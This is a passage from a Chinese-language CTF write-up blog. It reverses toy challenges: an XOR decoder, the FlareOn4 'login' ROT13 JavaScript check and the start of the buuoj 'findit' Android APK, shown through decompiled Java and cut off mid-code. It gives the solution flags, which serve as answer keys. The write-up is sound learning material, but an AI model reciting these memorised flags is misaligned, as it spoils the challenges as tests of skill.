        <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span>
l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token comment"># GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="js文件逆向"><a href="#js文件逆向" class="headerlink" title="js文件逆向"></a>js文件逆向</h3><p>这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。</p>
<h4 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h4><p>给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"prompt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz"</span> <span class="token operator">==</span> rotFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Incorrect flag, rot again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> 
	<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    	<span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那个<code>replace</code>函数负责遍历所有大小写字母，后面的<code>function</code>主要负责进行转换，将每个大小写字母带入其中即可，其中<code>90-&gt;&#39;Z&#39;</code>、<code>122-&gt;&#39;z&#39;</code>。后面的就很简单了，</p>
<ol>
<li>如果该字符是大写字母就将<code>Z</code>的ASCII码值与<code>c本身的ASCII码值+13</code>进行比较</li>
<li>如果<code>Z</code>比较大，就返回c本身的字符串，</li>
<li>反之则返回c的ASCII码值<code>-26</code>的数值所代表的ASCII字符。</li>
<li>小写字母是亦同理。</li>
</ol>
<p>这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的</p>
<p><img src="/2021/05/28/CTF/image-20210531174558489.png" alt="image-20210531174558489"></p>
<p>rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）</p>
<p><img src="/2021/05/28/CTF/image-20210531174817470.png" alt="image-20210531174817470"></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="方向介绍"><a href="#方向介绍" class="headerlink" title="方向介绍"></a>方向介绍</h2><p>这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。</p>
<h2 id="一般Android逆向"><a href="#一般Android逆向" class="headerlink" title="一般Android逆向"></a>一般Android逆向</h2><h3 id="buu、findit"><a href="#buu、findit" class="headerlink" title="buu、findit"></a>buu、findit</h3><p><strong>题目描述</strong></p>
<p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交</p>
<p><a target="_blank" rel="noopener" href="https://files.buuoj.cn/files/7b8602971727c6c82ec0d360d5cad2c0/6a428ff2-25d7-403c-b28e-3f980a10a5a2.apk?token=eyJ1c2VyX2lkIjo1ODI5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMTV9.YLL-JQ.1mkBIGgecp2UxMwmP7W7hIN_9NM"> buu在线题目附件地址</a></p>
<p><strong>解题过程</strong></p>
<p>给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。</p>
<p><img src="/2021/05/28/CTF/image-20210530102603082.png" alt="image-20210530102603082"></p>
<p>看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>findit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>support<span class="token punctuation">.</span>v7<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">ActionBarActivity</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Button</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">EditText</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">TextView</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">ActionBarActivity</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* access modifiers changed from: protected */</span>
    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">EditText</span> edit <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">TextView</span> text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token class-name">OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.example.findit.MainActivity.1</span>
            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'I'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'\b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">MenuItem</span> item<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>action_settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>猜测下面这段应该是获得flag 的关键<code>text.setText(String.valueOf(y));</code>这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
